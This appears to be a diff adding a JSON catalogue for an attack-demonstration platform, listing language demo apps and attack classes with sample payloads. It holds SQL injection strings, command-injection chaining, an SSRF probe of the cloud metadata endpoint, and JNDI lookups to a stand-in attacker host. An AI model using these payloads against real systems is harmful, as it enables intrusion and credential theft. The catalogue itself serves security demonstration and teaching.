@@ -1,0 +1,141 @@
+{
+  "applications": [
+    {
+      "id": "dotnet",
+      "name": ".NET",
+      "status": "live",
+      "path": "/dotnet",
+      "notes": "Instrumented demo app with injection scenarios."
+    },
+    {
+      "id": "java",
+      "name": "Java",
+      "status": "roadmap",
+      "path": "",
+      "notes": "Planned Spring Boot + Easy Travel profile."
+    },
+    {
+      "id": "go",
+      "name": "Go",
+      "status": "roadmap",
+      "path": "",
+      "notes": "Planned Go service profile."
+    },
+    {
+      "id": "python",
+      "name": "Python",
+      "status": "roadmap",
+      "path": "",
+      "notes": "Planned Flask/FastAPI profile."
+    },
+    {
+      "id": "node",
+      "name": "Node.js",
+      "status": "roadmap",
+      "path": "",
+      "notes": "Planned Express profile."
+    }
+  ],
+  "attacks": [
+    {
+      "id": "sqli",
+      "name": "SQL injection",
+      "summary": "Manipulate query logic to extract or alter data at runtime.",
+      "tags": ["Database", "Taint flow"],
+      "supportedApps": ["dotnet", "java", "node", "python", "go"],
+      "variants": [
+        {
+          "name": "Union-based",
+          "description": "Blend attacker-controlled results into a legitimate query.",
+          "example": "' UNION SELECT user, password FROM accounts --"
+        },
+        {
+          "name": "Boolean blind",
+          "description": "Infer data via true/false logic when errors are hidden.",
+          "example": "' OR 1=1 --"
+        },
+        {
+          "name": "Time-based blind",
+          "description": "Delay responses to confirm injectable parameters.",
+          "example": "' OR SLEEP(5) --"
+        }
+      ]
+    },
+    {
+      "id": "cmdi",
+      "name": "Command injection",
+      "summary": "Abuse system calls to execute arbitrary commands.",
+      "tags": ["Execution", "Process"],
+      "supportedApps": ["dotnet", "python", "node", "go"],
+      "variants": [
+        {
+          "name": "Inline chaining",
+          "description": "Append shell operators to extend a command.",
+          "example": "ping example.com && whoami"
+        },
+        {
+          "name": "Subshell",
+          "description": "Use shell interpolation to execute nested commands.",
+          "example": "$(cat /etc/hostname)"
+        }
+      ]
+    },
+    {
+      "id": "ssrf",
+      "name": "Server-side request forgery",
+      "summary": "Force servers to reach internal or cloud metadata targets.",
+      "tags": ["Network", "Lateral movement"],
+      "supportedApps": ["dotnet", "java", "python", "node"],
+      "variants": [
+        {
+          "name": "Metadata probe",
+          "description": "Query cloud metadata endpoints to discover secrets.",
+          "example": "http://169.254.169.254/latest/meta-data/"
+        },
+        {
+          "name": "Internal pivot",
+          "description": "Reach services bound to private IP ranges.",
+          "example": "http://10.0.0.20:8080/admin"
+        }
+      ]
+    },
+    {
+      "id": "jndi",
+      "name": "JNDI injection",
+      "summary": "Trigger remote lookups that can load unexpected code paths.",
+      "tags": ["Java", "Lookup"],
+      "supportedApps": ["java"],
+      "variants": [
+        {
+          "name": "LDAP lookup",
+          "description": "Use attacker-controlled LDAP endpoints for resolution.",
+          "example": "${jndi:ldap://attacker.local/a}"
+        },
+        {
+          "name": "RMI lookup",
+          "description": "Leverage RMI endpoints to chain serialization behavior.",
+          "example": "${jndi:rmi://attacker.local/b}"
+        }
+      ]
+    },
+    {
+      "id": "deserialize",
+      "name": "Insecure deserialization",
+      "summary": "Inject crafted objects that execute gadget chains.",
+      "tags": ["Deserialization", "Execution"],
+      "supportedApps": ["dotnet", "java"],
+      "variants": [
+        {
+          "name": "Gadget chain",
+          "description": "Trigger known gadget chains in serialized payloads.",
+          "example": "Binary payload with embedded gadget sequence"
+        },
+        {
+          "name": "Type confusion",
+          "description": "Swap expected types to reach unsafe code paths.",
+          "example": "JSON object with unexpected class hint"
+        }
+      ]
+    }
+  ]
+}
